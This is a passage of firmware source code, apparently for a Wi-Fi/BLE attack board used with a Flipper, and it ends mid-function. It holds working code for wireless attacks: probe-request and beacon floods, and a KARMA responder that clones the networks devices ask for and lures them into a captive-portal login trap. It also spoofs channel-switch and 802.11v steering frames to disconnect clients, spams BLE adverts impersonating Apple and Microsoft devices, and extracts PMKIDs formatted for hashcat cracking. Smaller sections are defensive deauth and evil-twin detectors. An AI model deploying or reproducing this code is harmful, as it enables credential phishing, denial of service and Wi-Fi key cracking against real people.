typedef struct { uint8_t mac[6]; uint16_t first; uint16_t last; uint16_t count; } cli_t;
static cli_t cli_list[CLI_MAX];
static uint8_t cli_n = 0;   // cross-task: atomic accessors below
#define CLIN_LOAD()  __atomic_load_n(&cli_n, __ATOMIC_ACQUIRE)
#define CLIN_SET(v)  __atomic_store_n(&cli_n, (v), __ATOMIC_RELEASE)
static volatile bool cli_on = false;
static uint32_t cli_base = 0;      // millis() at the window start; times are stored in seconds
// A2 RSSI: settled 2026-10-16 - the promisc callback buffer is the bare frame with its 4-byte FCS
// still attached and NO rx_info appended, so there is nothing to read an RSSI from. Measured over
// 107 frames on channel 7: the last four bytes (the FCS) spanned mn 00 12 00 00 .. mx F0 FC FD EE,
// i.e. nearly the whole byte range. A real RSSI sits in a narrow band and never jumps like that.
// Per-device RSSI therefore needs another mechanism; per-AP RSSI already comes from SCAN.

static void cli_add(const uint8_t* mac) {
  uint16_t now = (uint16_t)((millis() - cli_base) / 1000UL);
  uint8_t cn = CLIN_LOAD();
  for(uint8_t i = 0; i < cn; i++) {
    if(!memcmp(cli_list[i].mac, mac, 6)) {
      cli_list[i].last = now;
      if(cli_list[i].count < 65535) cli_list[i].count++;
      return;
    }
  }
  if(cn >= CLI_MAX) return;
  memcpy(cli_list[cn].mac, mac, 6);
  cli_list[cn].first = now;
  cli_list[cn].last = now;
  cli_list[cn].count = 1;
  CLIN_SET((uint8_t)(cn + 1));   // release: record published before the count
}

static void promisc_cli_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(!cli_on || len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t st = (buf[0] >> 4) & 0xF;
  uint8_t tods = buf[1] & 0x01, fromds = (buf[1] >> 1) & 0x01;
  const uint8_t *a1 = buf + 4, *a2 = buf + 10;
  const uint8_t* dev = NULL;
  if(ftype == 0) {                                  // mgmt
    if(st == 4 || st == 11 || st == 0 || st == 2) dev = a2;   // probe-req/auth/assoc/reassoc
  } else if(ftype == 2) {                           // data
    if(tods && !fromds) dev = a2;
    else if(!tods && fromds) dev = a1;
    else return;                                    // IBSS / WDS - ambiguous
  } else return;
  if(dev && !(dev[0] & 0x01)) cli_add(dev);         // skip multicast/broadcast
}

static void cli_stream(int ch) {
  uint8_t cn = CLIN_LOAD();
  for(uint8_t i = 0; i < cn; i++) {
    char line[80];
    snprintf(
      line,
      sizeof(line),
      "CLI:%02X:%02X:%02X:%02X:%02X:%02X|%u|%u|%u",
      cli_list[i].mac[0],
      cli_list[i].mac[1],
      cli_list[i].mac[2],
      cli_list[i].mac[3],
      cli_list[i].mac[4],
      cli_list[i].mac[5],
      (unsigned)cli_list[i].first,
      (unsigned)cli_list[i].last,
      (unsigned)cli_list[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "CLIDONE: ch=" + String(ch) + " n=" + String((unsigned)cn);
  Serial.println(fin); Serial1.println(fin);
}

static void sta_stream(int ch) {
  uint8_t sn = STA_LOAD();
  for (uint8_t i = 0; i < sn; i++) {
    char line[64];
    snprintf(line, sizeof(line), "STA:%02X:%02X:%02X:%02X:%02X:%02X|%u",
      sta_list[i].mac[0], sta_list[i].mac[1], sta_list[i].mac[2],
      sta_list[i].mac[3], sta_list[i].mac[4], sta_list[i].mac[5],
      (unsigned)__atomic_load_n(&sta_list[i].count, __ATOMIC_RELAXED));
    Serial.println(line); Serial1.println(line);
  }
  String fin = "STADONE: ch=" + String(ch) + " n=" + String((unsigned)STA_LOAD());
  Serial.println(fin); Serial1.println(fin);
}

// --- A1: probe-request sniffer / PNL extraction --------------------------------
// Devices broadcast probe requests naming the SSIDs they remember (their Preferred
// Network List). We log each sender's MAC + the requested SSID(s) so the Flipper can build
// a "known networks" inventory (recon / audit). Directed probes carry the SSID; wildcard
// probes reveal only the client. RSSI is not delivered to the promisc callback.
#define PROBE_MAX 12
typedef struct { uint8_t mac[6]; uint8_t n; char ssid[2][33]; } probe_t;
static probe_t probes[PROBE_MAX];
static uint8_t probe_n = 0;

static void probe_add(const uint8_t* mac, const char* ssid) {
  int idx = -1;
  for(uint8_t i = 0; i < probe_n; i++)
    if(!memcmp(probes[i].mac, mac, 6)) { idx = i; break; }
  if(idx < 0) {
    if(probe_n >= PROBE_MAX) return;
    idx = probe_n++;
    memcpy(probes[idx].mac, mac, 6);
    probes[idx].n = 0;
  }
  if(ssid && ssid[0]) {
    for(uint8_t k = 0; k < probes[idx].n; k++)
      if(!strcmp(probes[idx].ssid[k], ssid)) return;
    if(probes[idx].n < 2) {
      strncpy(probes[idx].ssid[probes[idx].n], ssid, 32);
      probes[idx].ssid[probes[idx].n][32] = 0;
      probes[idx].n++;
    }
  }
}

static void promisc_probe_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if(ftype != 0 || stype != 4) return;          // mgmt, probe request only
  const uint8_t* src = buf + 10;                // addr2
  if(src[0] & 0x01) return;                     // multicast/broadcast sender — skip
  char ssid[33]; ssid[0] = 0;
  unsigned int p = 24;
  while(p + 2 <= len) {
    uint8_t id = buf[p], il = buf[p + 1];
    if(p + 2 + il > len) break;
    if(id == 0) {                               // SSID IE
      int n = il > 32 ? 32 : il;
      memcpy(ssid, buf + p + 2, n);
      ssid[n] = 0;
      break;
    }
    p += 2 + il;
  }
  probe_add(src, ssid);
}

static void probe_stream(int ch) {
  for(uint8_t i = 0; i < probe_n; i++) {
    char line[160];
    int n = snprintf(line, sizeof(line), "PROBE:%02X:%02X:%02X:%02X:%02X:%02X|",
      probes[i].mac[0], probes[i].mac[1], probes[i].mac[2],
      probes[i].mac[3], probes[i].mac[4], probes[i].mac[5]);
    if(probes[i].n == 0) {
      n += snprintf(line + n, sizeof(line) - n, "*");
    } else {
      for(uint8_t k = 0; k < probes[i].n; k++) {
        char one[33]; sanitize_text(probes[i].ssid[k], one, sizeof(one));
        n += snprintf(line + n, sizeof(line) - n, "%s%s", k ? "," : "", one);
      }
    }
    Serial.println(line); Serial1.println(line);
  }
  String fin = "PROBEDONE: ch=" + String(ch) + " n=" + String((unsigned)probe_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- B7: probe-request flood (raw probe request frames) -------------------------
static void tx_probe_req(const uint8_t* src, const char* ssid) {
  uint8_t f[128]; int n = 0;
  f[n++] = 0x40; f[n++] = 0x00;                 // frame control: probe request
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr1 broadcast
  for(int i = 0; i < 6; i++) f[n++] = src[i];   // addr2 src
  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr3 bssid
  f[n++] = 0x00; f[n++] = 0x00;                 // seq
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID element
  for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
  f[n++] = 0x01; f[n++] = 0x04;                 // supported rates IE
  f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
  wifi_tx_raw_frame(f, n);
}

// Beacon/SSID-flood frames built by hand and pushed through the SAME raw TX path the probe
// and auth frames use. The SDK's wifi_tx_beacon_frame() (wifi_cust_tx.cpp) locks the board up
// hard: 6 beacon frames in a row hang the loop while 60 probe frames in a row are fine, so the
// whole beacon-spam family (custom/random/rickroll/ghost/AP-clone) was dead. This avoids that
// code path entirely. The raw TX buffer only has 0x68-0x28 = 64 usable bytes, so the SSID is
// capped to keep the frame inside it.
// Frame-body cap for the raw TX staging buffer (tx_stage). It used to be 64 while the buffer was
// 128, so a 24-char SSID pushed the rates IE and the DS Parameter Set past the cap and the beacon
// stopped advertising its channel. Keep it equal to the buffer.
#define TX_RAW_MAX_PAYLOAD 128
static const uint8_t TX_BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst,
                              const char* ssid, uint8_t ftype, int chan) {
  int n = 0;
  f[n++] = ftype; f[n++] = 0x00;                // frame control (0x80 beacon / 0x50 probe resp)
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  memcpy(f + n, dst, 6); n += 6;                // addr1 destination
  memcpy(f + n, src, 6); n += 6;                // addr2 source
  memcpy(f + n, src, 6); n += 6;                // addr3 bssid
  f[n++] = 0x00; f[n++] = 0x00;                 // sequence (set by the driver)
  for(int i = 0; i < 8; i++) f[n++] = 0x00;     // timestamp
  f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval
  f[n++] = 0x21; f[n++] = 0x00;                 // capability (ESS)
  // The optional IEs are appended only while they still fit, but the SSID is what has to survive
  // intact. The DS Parameter Set (our channel) is what makes the SSID appear in a normal scan list.
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > 32) sl = 32;   // 802.11 SSID element limit (the buffer cap alone allowed 88)
  f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID IE
  for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
  if(n + 6 <= TX_RAW_MAX_PAYLOAD) {             // supported rates IE
    f[n++] = 0x01; f[n++] = 0x04;
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
  }
  if(n + 3 <= TX_RAW_MAX_PAYLOAD) {             // DS parameter set = the channel we transmit on
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = (uint8_t)chan;
  }
  return n;
}

// TX frame staging buffers live in BSS, not on the loop() stack: loop() already carries the
// whole command dispatch and the TX path needs its own stack depth. Putting the frame array
// directly in loop()'s frame wedged the board (observed), while the identical frame sent from
// tx_probe_req() (array inside a called function) went out fine.
static uint8_t tx_stage[128];

static int tx_raw_hex(const char* h) {
  int n = 0;
  for(int i = 0; h[i] && h[i+1] && n < (int)sizeof(tx_stage); i += 2) {
    int hi = hexnib(h[i]), lo = hexnib(h[i+1]);
    if(hi < 0 || lo < 0) break;
    tx_stage[n++] = (uint8_t)((hi << 4) | lo);
  }
  if(n > 0) wifi_tx_raw_frame(tx_stage, n);
  return n;
}

// NOTE (root cause of the "board locks up" bug): wifi_tx_raw_frame()/dump_mgntframe() do NOT
// complete unless the radio is tuned to a channel. Without a wext_set_channel() right before
// the TX the SDK spins forever inside the TX path (board dead: no replies, no reboot, no fault
// print). PROBEFLOOD always worked because it tunes the channel first; APCLONE and the beacon
// spam code did not. Tuning inside this helper means no caller can forget it again.
static void tx_beacon_raw(const uint8_t* src, const uint8_t* dst, const char* ssid, uint8_t ftype, int chan) {
  if(chan < 1 || chan > 165) chan = 6;
  wext_set_channel(WLAN0_NAME, chan);
  int n = build_beacon_frame(tx_stage, src, dst, ssid, ftype, chan);
  if(n > (int)sizeof(tx_stage)) n = (int)sizeof(tx_stage);
  if(n > 0) wifi_tx_raw_frame(tx_stage, n);
}

// --- B1: KARMA / known-beacon responder ---------------------------------------
// Sniff probe requests (promiscuous) and answer every requested SSID with a probe response to the
// requesting client plus a broadcast beacon, both cloning that SSID. The BSSID is derived from the
// SSID so repeated probes keep mapping to the same fake AP. Devices that remember the network see
// it again and can then be pulled into the captive portal (C1 = Trap). TX is deferred to loop():
// the promisc callback runs in the WiFi task, so it only records the request there.
static bool karma_on = false;   // cross-task: atomic accessors below
static int karma_chan = 6;
// KARMA request hand-off: the WiFi promiscuous task produces, loop() consumes. A single flag plus
// shared buffers let the producer overwrite the bytes while loop() was still reading them, so the
// request goes through a 2-slot ring and loop() copies the slot out before releasing it.
#define KARMA_Q 2
static char     karma_q_ssid[KARMA_Q][33];
static uint8_t  karma_q_cli[KARMA_Q][6];
static unsigned karma_q_tail = 0;   // producer
static unsigned karma_q_head = 0;   // consumer
static char karma_ssid[33] = {0};   // consumer-side copy (what the rest of loop() reads)
static uint8_t karma_client[6] = {0};
#define KQ_LOAD(p)   __atomic_load_n((p), __ATOMIC_ACQUIRE)
#define KQ_STORE(p, v) __atomic_store_n((p), (v), __ATOMIC_RELEASE)
#define KON_LOAD()   __atomic_load_n(&karma_on, __ATOMIC_ACQUIRE)
#define KON_STORE(v) __atomic_store_n(&karma_on, (v), __ATOMIC_RELEASE)

// loop() side: take the oldest request into karma_ssid/karma_client. False when there is none.
static bool karma_take(void) {
  unsigned h = KQ_LOAD(&karma_q_head);
  if (h == KQ_LOAD(&karma_q_tail)) return false;
  memcpy(karma_ssid, karma_q_ssid[h], sizeof(karma_ssid));
  memcpy(karma_client, karma_q_cli[h], sizeof(karma_client));
  KQ_STORE(&karma_q_head, (h + 1) % KARMA_Q);
  return true;
}
// --- C1: KARMA -> Trap -----------------------------------------------------------------
// Same sniffing as B1, but the first requested SSID is cloned for real: a softAP with that name
// is started and the existing captive-portal plumbing serves the login page, so a device that
// remembers the network can actually associate and land on the portal. Once the AP is up its own
// beacons advertise the SSID, so the raw responses stop (they would also fight the AP's channel).
static bool trap_on = false;
static bool trap_armed = true;
static char trap_ssid[33] = {0};
#define KARMA_SEEN_MAX 8
static char karma_seen[KARMA_SEEN_MAX][33];
// Written by the WiFi promiscuous task, read by loop(): publish with release, read with acquire, so
// a reader that sees the count also sees the string it counts.
static int karma_seen_n = 0;
#define KSEEN_LOAD()      __atomic_load_n(&karma_seen_n, __ATOMIC_ACQUIRE)
#define KSEEN_STORE(v)    __atomic_store_n(&karma_seen_n, (v), __ATOMIC_RELEASE)

static void karma_note(const char* s) {
  int n = KSEEN_LOAD();
  for(int i = 0; i < n; i++)
    if(strcmp(karma_seen[i], s) == 0) return;
  if(n < KARMA_SEEN_MAX) {
    strncpy(karma_seen[n], s, 32);
    karma_seen[n][32] = 0;
    KSEEN_STORE(n + 1);
  }
}

static void promisc_karma_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(!KON_LOAD() || len < 24) return;
  if(((buf[0] >> 2) & 3) != 0) return;    // management frames only
  if(((buf[0] >> 4) & 0x0F) != 4) return; // subtype 4 = probe request
  int p = 24;                             // probe requests have no fixed params before the IEs
  while(p + 2 <= (int)len) {
    int id = buf[p], l = buf[p + 1];
    if(id == 0) {
      if(l == 0 || l > 32 || p + 2 + l > (int)len) return;  // wildcard/empty or malformed
      for(int i = 0; i < l; i++) {
        uint8_t c = buf[p + 2 + i];
        if(c < 32 || c > 126) return;     // only answer printable SSIDs
      }
      unsigned t = KQ_LOAD(&karma_q_tail);
      if ((t + 1) % KARMA_Q == KQ_LOAD(&karma_q_head)) {
        // Ring full: this probe is not answered, but it must still show up in KARMALIST.
        char seen[33];
        memcpy(seen, buf + p + 2, l); seen[l] = 0;
        karma_note(seen);
        return;
      }
      memcpy(karma_q_cli[t], buf + 10, 6);  // addr2 = the probing client
      memcpy(karma_q_ssid[t], buf + p + 2, l);
      karma_q_ssid[t][l] = 0;
      karma_note(karma_q_ssid[t]);
      KQ_STORE(&karma_q_tail, (t + 1) % KARMA_Q);
      return;
    }
    p += 2 + l;
  }
}

// --- B2: CSA (channel switch announcement) spoofing ---------------------------
// An unprotected Spectrum Management action frame telling the clients of <bssid> to move to
// <newch>: they leave the AP without any deauth. Clients that require protected CSA (PMF/WPA3)
// ignore it - that is the known limitation, not a bug. The board must transmit on the AP's own
// channel, so the caller tunes it first.
static void csa_send_frame(const uint8_t* bssid, uint8_t newch, uint8_t count, uint8_t mode, const uint8_t* dst) {
  uint8_t f[64];
  int n = 0;
  f[n++] = 0xD0; f[n++] = 0x00;              // frame control: action
  f[n++] = 0x00; f[n++] = 0x00;              // duration
  memcpy(f + n, dst, 6); n += 6;             // addr1: the client (or broadcast)
  memcpy(f + n, bssid, 6); n += 6;           // addr2: source, spoofed as the AP
  memcpy(f + n, bssid, 6); n += 6;           // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;              // sequence (driver fills it)
  f[n++] = 0x00;                             // category: spectrum management
  f[n++] = 0x04;                             // action: channel switch announcement
  f[n++] = 0x25; f[n++] = 0x03;              // CSA information element
  f[n++] = mode;                             // 0 = stop on the old channel, 1 = both channels
  f[n++] = newch;
  f[n++] = count;
  memset(tx_stage, 0, n);
  memcpy(tx_stage, f, n);
  wifi_tx_raw_frame(tx_stage, n);
}

// --- B3: 802.11v BSS transition management (BTM) request -------------------------------
// A WNM action frame (category 0x0A, action 0x07) - what an AP legitimately sends to steer a
// client to another BSS (band steering / load balancing). Spoofed from the target AP it asks a
// client that supports 802.11v to move to a candidate on <newch>, and the candidate is a
// locally-administered phantom BSSID, so the client roams off and finds nothing. No deauth
// frame is involved anywhere: same class of effect as CSA, with CSA's same limit - a client
// that requires protected management frames (PMF/WPA3) ignores it - and the board must already
// be tuned to the AP's channel (the caller does that).
// Layout: action header, dialog token, request mode 0x05 (preferred candidate list +
// disassociation imminent), disassociation timer, validity interval, neighbor report element.
static void btm_send_frame(const uint8_t* bssid, uint8_t newch, const uint8_t* dst) {
  uint8_t f[80];
  int n = 0;
  f[n++] = 0xD0; f[n++] = 0x00;              // frame control: action
  f[n++] = 0x00; f[n++] = 0x00;              // duration
  memcpy(f + n, dst, 6); n += 6;             // addr1: the client (or broadcast)
  memcpy(f + n, bssid, 6); n += 6;           // addr2: source, spoofed as the AP
  memcpy(f + n, bssid, 6); n += 6;           // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;              // sequence (driver fills it)
  f[n++] = 0x0A;                             // category: wireless network management
  f[n++] = 0x07;                             // action: BSS transition management request
  f[n++] = 0x01;                             // dialog token
  f[n++] = 0x05;                             // request mode: candidate list + disassoc imminent
  f[n++] = 0x00; f[n++] = 0x01;              // disassociation timer (LE, 100 TU)
  f[n++] = 0x00;                             // validity interval (beacon intervals)
  f[n++] = 0x34;                             // element: neighbor report (52)
  f[n++] = 0x0D;                             // element length: 13
  f[n++] = (uint8_t)(bssid[0] | 0x02);       // candidate BSSID: locally administered phantom
  f[n++] = bssid[1];                         //  built from the AP's own MAC, so the "sibling"
  f[n++] = bssid[2];                         //  looks plausible but does not exist
  f[n++] = bssid[3];
  f[n++] = bssid[4];
  f[n++] = (uint8_t)(bssid[5] ^ 0x01);
  f[n++] = 0x07; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;  // BSSID info: reachable + secured
  f[n++] = (newch > 14) ? 0x79 : 0x51;       // regulatory class (FCC 2.4 / 5 GHz)
  f[n++] = newch;                            // channel number
  f[n++] = 0x07;                             // PHY type: HT
  memset(tx_stage, 0, n);
  memcpy(tx_stage, f, n);
  wifi_tx_raw_frame(tx_stage, n);
}

static void karma_respond(const char* ssid, const uint8_t* client, int chan) {
  uint8_t bssid[6];
  uint32_t h = 2166136261u;               // FNV-1a -> stable BSSID per SSID
  for(const char* p = ssid; *p; p++) { h ^= (uint8_t)*p; h *= 16777619u; }
  bssid[0] = 0x02;                        // locally administered
  bssid[1] = (h >> 8) & 0xFF;
  bssid[2] = (h >> 16) & 0xFF;
  bssid[3] = (h >> 24) & 0xFF;
  bssid[4] = 0x4B; bssid[5] = 0x4D;       // "KM"
  tx_beacon_raw(bssid, client, ssid, 0x50, chan);   // probe response -> this client
  tx_beacon_raw(bssid, TX_BCAST, ssid, 0x80, chan); // beacon -> passive scanners
}

// --- D2: BLE advert spam (Apple continuity + Microsoft Swift Pair) ---------------
// Packet layouts from https://github.com/Flipper-XFW/Xtreme-Apps ble_spam protocols.
static uint8_t blespam_pkt(uint8_t* p, uint8_t type) {
  if(type == 3) {   // Microsoft Swift Pair
    static const char* names[] = {"Flipper", "Windows", "SwiftPair", "BT-Device"};
    const char* nm = names[random(0, 4)];
    uint8_t nl = (uint8_t)strlen(nm);
    if(nl > 20) nl = 20;
    p[0] = (uint8_t)(6 + nl); p[1] = 0xFF; p[2] = 0x06; p[3] = 0x00;
    p[4] = 0x03; p[5] = 0x00; p[6] = 0x80;
    memcpy(p + 7, nm, nl);
    return (uint8_t)(7 + nl);
  }
  if(type == 1) {   // Apple Nearby Action ("Setup New iPhone", "Join This AppleTV?", ...)
    static const uint8_t actions[] = {0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B};
    p[0] = 10; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x0F; p[5] = 5;
    p[6] = 0xC0;
    p[7] = actions[random(0, 12)];
    for(int i = 0; i < 3; i++) p[8 + i] = (uint8_t)random(0, 256);
    return 11;
  }
  if(type == 2) {   // Apple AirDrop
    p[0] = 23; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x05; p[5] = 18;
    for(int i = 6; i < 14; i++) p[i] = 0x00;
    p[14] = 0x01;
    for(int i = 15; i < 23; i++) p[i] = (uint8_t)random(0, 256);
    return 24;
  }
  // default: Apple Proximity Pair (AirPods / AirTag / Beats ...)
  static const uint16_t models[] = {0x0E20,0x0A20,0x0055,0x0220,0x0F20,0x1320,
                                    0x1420,0x1020,0x0620,0x0320,0x0B20,0x0520};
  uint16_t m = models[random(0, 12)];
  p[0] = 30; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x07; p[5] = 25;
  p[6] = (m == 0x0055) ? 0x05 : 0x07;          // airtag -> 0x05, else "new device"
  p[7] = (uint8_t)((m >> 8) & 0xFF);
  p[8] = (uint8_t)(m & 0xFF);
  p[9] = 0x55;
  p[10] = (uint8_t)((random(0, 10) << 4) + random(0, 10));
  p[11] = (uint8_t)((random(0, 8) << 4) + random(0, 10));
  p[12] = (uint8_t)random(0, 256);
  p[13] = 0x00;
  p[14] = 0x00;
  for(int i = 15; i < 31; i++) p[i] = (uint8_t)random(0, 256);
  return 31;
}

// --- A5: deauth/disassoc sniffer (IDS) ------------------------------------------
// Flags other people's deauth attacks: counts deauth(0x0C)/disassoc(0x0A) frames per
// (src,dst,reason) so the host can list who is knocking whom off, and why.
#define IDS_MAX 16
typedef struct { uint8_t src[6], dst[6]; uint8_t reason; uint16_t count; } ids_t;
static ids_t ids[IDS_MAX];
static uint8_t ids_n = 0;

static void ids_add(const uint8_t* src, const uint8_t* dst, uint8_t reason) {
  for(uint8_t i = 0; i < ids_n; i++)
    if(!memcmp(ids[i].src, src, 6) && !memcmp(ids[i].dst, dst, 6) && ids[i].reason == reason) {
      ids[i].count++;
      return;
    }
  if(ids_n >= IDS_MAX) return;
  memcpy(ids[ids_n].src, src, 6);
  memcpy(ids[ids_n].dst, dst, 6);
  ids[ids_n].reason = reason;
  ids[ids_n].count = 1;
  ids_n++;
}

static void promisc_ids_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(len < 26) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if(ftype != 0) return;
  if(stype != 0x0C && stype != 0x0A) return;   // deauth / disassoc
  ids_add(buf + 10 /*addr2 src*/, buf + 4 /*addr1 dst*/, buf[24]);
}

static void ids_stream(int ch) {
  for(uint8_t i = 0; i < ids_n; i++) {
    char line[96];
    snprintf(line, sizeof(line),
      "DEAUTH:%02X:%02X:%02X:%02X:%02X:%02X>%02X:%02X:%02X:%02X:%02X:%02X|r%u|x%u",
      ids[i].src[0], ids[i].src[1], ids[i].src[2], ids[i].src[3], ids[i].src[4], ids[i].src[5],
      ids[i].dst[0], ids[i].dst[1], ids[i].dst[2], ids[i].dst[3], ids[i].dst[4], ids[i].dst[5],
      (unsigned)ids[i].reason, (unsigned)ids[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "DEAUTHDONE: ch=" + String(ch) + " n=" + String((unsigned)ids_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- M3: continuous passive WIDS (deauth-flood + evil-twin RSN-downgrade) ----------------------
// Pure detectors live in wids.h (host-tested). The promisc callback runs in the WiFi-driver task,
// so it must not touch Serial: alerts are queued (SPSC ring, DMB-fenced like frm_ring) and emitted
// from loop(). Listen-only/defensive — never transmits. Parks on one channel (windowed counts only
// cover that channel; hopping would fragment them — a slice-1 limitation, documented).
static wids_state g_wids;
static volatile bool wids_on = false;
static volatile int  wids_ch = 6;
typedef struct { uint8_t type; uint8_t key[6]; uint16_t aux; } wids_alert_t;
#define WIDS_Q 8
static wids_alert_t wids_q[WIDS_Q];
static uint8_t wids_qh = 0, wids_qt = 0;   // SPSC: producer owns qt, consumer owns qh

static inline void wids_push(uint8_t type, const uint8_t* key, uint16_t aux) {
  uint8_t t = FRM_LOAD(&wids_qt);
  uint8_t nt = (uint8_t)((t + 1) & (WIDS_Q - 1));
  if (nt == FRM_LOAD(&wids_qh)) return;   // full: drop (debounce makes overflow very unlikely)
  wids_q[t].type = type;
  memcpy(wids_q[t].key, key, 6);
  wids_q[t].aux = aux;
  FRM_STORE(&wids_qt, nt);   // release: slot published before the index
}

static void promisc_wids_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if (len < 26) return;
  __atomic_add_fetch(&g_wids.seen_frames, 1u, __ATOMIC_RELAXED);
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if (ftype != 0) return;
  uint32_t now = millis();
  if (stype == 0x0C || stype == 0x0A) {                 // deauth / disassoc
    const uint8_t* src = buf + 10;                      // addr2
    if (wids_feed_deauth(&g_wids, src, now) == WIDS_DEAUTH_FLOOD) wids_push(WIDS_DEAUTH_FLOOD, src, 0);
  } else if (stype == 8 || stype == 5) {                // beacon / probe-resp
    uint8_t bssid[6], sc; uint16_t sh;
    if (wids_parse_beacon(buf, len, bssid, &sh, &sc)) {
      int a = wids_feed_beacon(&g_wids, bssid, sh, sc, now);  // evil-twin / beacon-flood / karma
      if (a) wids_push((uint8_t)a, bssid, sh);
    }
  }
}

static void wids_drain(void) {
  while (FRM_LOAD(&wids_qh) != FRM_LOAD(&wids_qt)) {
    uint8_t h = FRM_LOAD(&wids_qh);   // acquire: slot visible after the index
    wids_alert_t* a = &wids_q[h];
    char m[80];
    const char* name = (a->type == WIDS_DEAUTH_FLOOD) ? "DEAUTHFLOOD" :
                       (a->type == WIDS_EVIL_TWIN)    ? "EVILTWIN"    :
                       (a->type == WIDS_BEACON_FLOOD) ? "BEACONFLOOD" :
                       (a->type == WIDS_KARMA)        ? "KARMA"       : "ALERT";
    snprintf(m, sizeof(m), "WIDS:%s %02X%02X%02X%02X%02X%02X aux=%04X", name,
             a->key[0], a->key[1], a->key[2], a->key[3], a->key[4], a->key[5], a->aux);
    Serial.println(m); Serial1.println(m);
    FRM_STORE(&wids_qh, (uint8_t)((h + 1) & (WIDS_Q - 1)));   // release: slot drained
  }
}

// --- P6: PMKID extraction from EAPOL-Key M1 ----------------------------------
// Clientless PMKID: many WPA2 APs put the PMKID in the RSN key-data KDE of the very
// first EAPOL-Key (M1). We identify M1 (key info ACK set, MIC clear, RSN descriptor)
// and pull the 16-byte PMKID from KDE `dd 14 00 0f ac 04`. If the AP was scanned we
// also emit a ready hashcat -m 22000 line; otherwise the raw PMKID + MACs.
#define PMKID_MAX 8
typedef struct { uint8_t ap[6], sta[6], pmkid[16]; } pmkid_t;
static pmkid_t pmkids[PMKID_MAX];
static uint8_t pmkid_n = 0;   // cross-task: atomic accessors below
#define PMKN_LOAD()  __atomic_load_n(&pmkid_n, __ATOMIC_ACQUIRE)
#define PMKN_SET(v)  __atomic_store_n(&pmkid_n, (v), __ATOMIC_RELEASE)
static volatile uint32_t cl_eapol = 0;   // EAPOL frames seen during a clientless grab (debug)

static void hex12(const uint8_t* m, char* out) {
  snprintf(out, 13, "%02x%02x%02x%02x%02x%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void pmkid_handle(const uint8_t* buf, unsigned len) {
  unsigned e;
  if (len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) e = 32;          // + LLC/SNAP -> EAPOL
  else if (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e) e = 34;     // QoS data
  else if (len >= 38 && buf[36] == 0x88 && buf[37] == 0x8e) e = 38;     // QoS + HT Control
  else return;
  if (e + 99 > len) return;                    // EAPOL-Key fixed part is 95 B after hdr
  if (buf[e + 1] != 3) return;                 // EAPOL type = EAPOL-Key
  if (buf[e + 4] != 2) return;                 // RSN key descriptor
  // Key Information is big-endian; ACK = bit 7 (0x0080), MIC = bit 8 (0x0100).
  uint16_t ki = ((uint16_t)buf[e + 5] << 8) | buf[e + 6];
  if (!(ki & 0x0080) || (ki & 0x0100)) return; // M1: ACK set, MIC clear
  uint16_t kdl = ((uint16_t)buf[e + 97] << 8) | buf[e + 98];
  if (kdl < 22 || e + 99 + (unsigned)kdl > len) return;
  const uint8_t* kd = buf + e + 99;
  for (unsigned i = 0; i + 22 <= kdl; i++) {
    if (kd[i] == 0xdd && kd[i+1] == 0x14 && kd[i+2] == 0x00 &&
        kd[i+3] == 0x0f && kd[i+4] == 0xac && kd[i+5] == 0x04) {
      const uint8_t* ap = (buf[1] & 0x02) ? buf + 10 : buf + 16;   // addr2 if FromDS
      const uint8_t* sta = buf + 4;                                // addr1 = receiver
      if (hsg_target_set && memcmp(ap, hsg_bssid, 6) != 0) return; // bind PMKID to the selected AP
      uint8_t pn = PMKN_LOAD();
      for (uint8_t k = 0; k < pn; k++)
        if (!memcmp(pmkids[k].pmkid, kd + i + 6, 16)) return;      // dedupe
      if (pn >= PMKID_MAX) return;
      memcpy(pmkids[pn].ap, ap, 6);
      memcpy(pmkids[pn].sta, sta, 6);
      memcpy(pmkids[pn].pmkid, kd + i + 6, 16);
      PMKN_SET((uint8_t)(pn + 1));   // release: record published before the count
      return;
    }
  }
}

static void promisc_pmkid_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
